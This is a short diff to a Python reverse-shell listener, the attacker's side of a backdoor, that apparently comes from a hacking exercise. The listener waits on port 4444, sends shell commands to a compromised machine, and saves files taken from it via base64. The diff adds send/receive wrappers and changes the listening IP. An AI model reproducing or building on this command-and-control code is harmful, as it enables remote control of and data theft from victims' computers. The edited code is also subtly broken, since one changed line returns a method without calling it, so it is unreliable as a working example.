@@ -1,5 +1,5 @@
 #!/usr/bin/python
-import socket, json
+import socket, json, base64
 
 class Listener:
     def __init__(self, ip, port):
@@ -25,16 +25,16 @@ class Listener:
                 continue    
 
     def execute_remotely(self, command):
-        self.connection.send(command)
+        self.reliable_send(command)
 
         if command[0] == "exit":
             self.connection.close()
             exit()
 
-        return self.connections.recv(1024)
+        return self.reliable_receive
 
     def write_file(self, path, content):
-        with open(path, wb) as file:
+        with open(path, "wb") as file:
             file.write(base64.b64decode(content))
             return "[+] Download successful"
     
@@ -61,5 +61,5 @@ class Listener:
 
             print(result)
 
-my_listner = Listener("10.100.102.6", 4444)
+my_listner = Listener("10.100.102.10", 4444)
 my_listner.run()
